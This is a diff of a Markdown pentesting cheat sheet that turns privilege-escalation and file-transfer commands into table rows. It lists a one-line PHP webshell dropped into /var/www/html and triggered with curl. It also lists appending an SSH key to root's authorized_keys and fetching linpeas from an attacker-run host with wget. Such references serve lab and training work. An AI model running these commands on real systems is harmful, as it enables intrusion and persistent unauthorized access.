@@ -71,69 +71,23 @@
 `ctrl+z`  then  `stty raw -echo`  then  `fg`  then  `enter`  twice| Upgrade shell TTY (2)
 `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` |Create a webshell php file
 `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell
-**Privilege Escalation**
-
-`./linpeas.sh`
-
-Run  `linpeas`  script to enumerate remote server
-
-`sudo -l`
-
-List available  `sudo`  privileges
-
-`sudo -u user /bin/echo Hello World!`
-
-Run a command with  `sudo`
-
-`sudo su -`
-
-Switch to root user (if we have access to  `sudo su`)
-
-`sudo su user -`
-
-Switch to a user (if we have access to  `sudo su`)
-
-`ssh-keygen -f key`
-
-Create a new SSH key
-
-`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
-
-Add the generated public key to the user
-
-`ssh  root@10.10.10.10  -i key`
-
-SSH to the server with the generated private key
-
-**Transferring Files**
-
-`python3 -m http.server 8000`
-
-Start a local webserver
-
-`wget http://10.10.14.1:8000/linpeas.sh`
-
-Download a file on the remote server from our local machine
-
-`curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
-
-Download a file on the remote server from our local machine
-
-`scp linenum.sh user@remotehost:/tmp/linenum.sh`
-
-Transfer a file to the remote server with  `scp`  (requires SSH access)
-
-`base64 shell -w 0`
-
-Convert a file to  `base64`
-
-`echo f0VMR...SNIO...InmDwU | base64 -d > shell`
-
-Convert a file from  `base64`  back to its orig
-
-`md5sum shell`
-
-Check the file's  `md5sum`  to ensure it converted correctly
+**Privilege Escalation** | 
+`./linpeas.sh` | Run  `linpeas`  script to enumerate remote server
+`sudo -l` | List available  `sudo`  privileges
+`sudo -u user /bin/echo Hello World!` | Run a command with  `sudo`
+`sudo su -` | Switch to root user (if we have access to  `sudo su`)
+`sudo su user -` | Switch to a user (if we have access to  `sudo su`)
+`ssh-keygen -f key` | Create a new SSH key
+`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user
+`ssh  root@10.10.10.10  -i key` | SSH to the server with the generated private key
+**Transferring Files** |
+`python3 -m http.server 8000` | Start a local webserver
+`wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine
+`curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine
+`scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with  `scp`  (requires SSH access)
+`base64 shell -w 0` | Convert a file to  `base64`
+`echo f0VMR...SNIO...InmDwU | base64 -d > shell` | Convert a file from  `base64`  back to its orig
+`md5sum shell` | Check the file's  `md5sum`  to ensure it converted correctly
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNjI1OTE0OTM3XX0=
+eyJoaXN0b3J5IjpbOTAyMjEwNzg1XX0=
 -->
